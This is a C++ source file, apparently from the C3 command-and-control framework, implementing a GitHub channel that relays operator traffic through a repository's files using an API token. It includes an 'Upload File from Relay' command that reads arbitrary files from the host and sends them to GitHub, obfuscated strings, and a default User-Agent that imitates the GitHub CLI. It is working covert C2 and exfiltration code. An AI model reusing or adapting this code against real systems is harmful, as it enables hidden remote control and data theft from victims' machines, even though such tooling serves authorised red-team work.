#include "Stdafx.h"
#include "Github.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <fstream>

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::Github::Github(ByteView arguments)
	: m_inboundDirectionName{ arguments.Read<std::string>() }
	, m_outboundDirectionName{ arguments.Read<std::string>() }
{
	auto [GithubToken, channelName, userAgent] = arguments.Read<std::string, std::string, std::string>();
	m_githubObj = FSecure::GithubApi{ GithubToken, channelName, userAgent };
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::Github::OnSendToChannel(ByteView data)
{
	// There is a cap on uploads of files >100 at which point different APIs are required.
	data = data.SubString(0, 100 * 1024 * 1024);

	auto filename = m_outboundDirectionName + '-' + FSecure::Utils::GenerateRandomString(10) + '-' + std::to_string(FSecure::Utils::MillisecondsTimestamp());
	m_githubObj.UploadFile(data, filename);
	return data.size();
}

//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::Github::OnReceiveFromChannel()
{
	std::vector<ByteVector> ret;
	auto files = m_githubObj.GetMessagesByDirection(m_inboundDirectionName);
	std::sort(begin(files), end(files), [&](GithubApi::FileEntry const& file, GithubApi::FileEntry const& file2)
		{
			auto getTimestampFromFilename = [](std::string const& filename)
			{
				auto ts = std::string{ FSecure::Utils::Split(filename, "-").at(2) };
				return std::stoull(ts);
			};
			return getTimestampFromFilename(file.m_Name) < getTimestampFromFilename(file2.m_Name);
		}
	);
	for (auto& file : files)
	{
		ret.push_back(m_githubObj.ReadFile(file.m_DownloadUrl));
		m_githubObj.DeleteFile(file);
	}

	return ret;
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::Github::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCopy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		UploadFile(command);
		return {};
	case 1:
		DeleteAllFiles();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}

void FSecure::C3::Interfaces::Channels::Github::UploadFile(ByteView args)
{
	std::filesystem::path filepathForUpload = args.Read<std::string>();
	auto readFile = std::ifstream(filepathForUpload, std::ios::binary);

	ByteVector packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };

	std::string ts = std::to_string(FSecure::Utils::TimeSinceEpoch());
	std::string fn = filepathForUpload.filename().string();  // retain same file name and file extension for convenience.
	std::string filename = OBF("upload-") + FSecure::Utils::GenerateRandomString(10) + OBF("-") + ts + OBF("-") + fn;
	m_githubObj.UploadFile(packet, filename);
}


void FSecure::C3::Interfaces::Channels::Github::DeleteAllFiles()
{
	m_githubObj.DeleteAllFiles();
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::Github::GetCapability()
{
	return R"_(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"min": 4,
					"randomize": true,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Github token",
				"min": 1,
				"description": "This token is what channel needs to interact with Github's API"
			},
			{
				"type": "string",
				"name": "Repositary name",
				"min": 4,
				"randomize": true,
				"description": "Repositary to create for channel"
			},
			{
				"type": "string",
				"name": "User-Agent Header",
				"description": "The User-Agent header to set. The API requires a UA is set. Warning: adding user agent header of web browser, can cause site security provider to block access to api, and prevent channel from functioning.",
				"min": 1,
				"defaultValue": "GitHub CLI v1.2.3"
			}
		]
	},
	"commands":
	[
		{
			"name": "Upload File from Relay",
			"id": 0,
			"description": "Upload file from host running Relay directly to Github",
			"arguments":
			[
				{
                    "type" : "string",
					"name": "Remote Filepath",
					"description" : "Path to upload."
				}
			]
		},
		{
			"name": "Remove All Files",
			"id": 1,
			"description": "Delete channel folder and all files within it.",
			"arguments": []
		}
	]
}
)_";
}
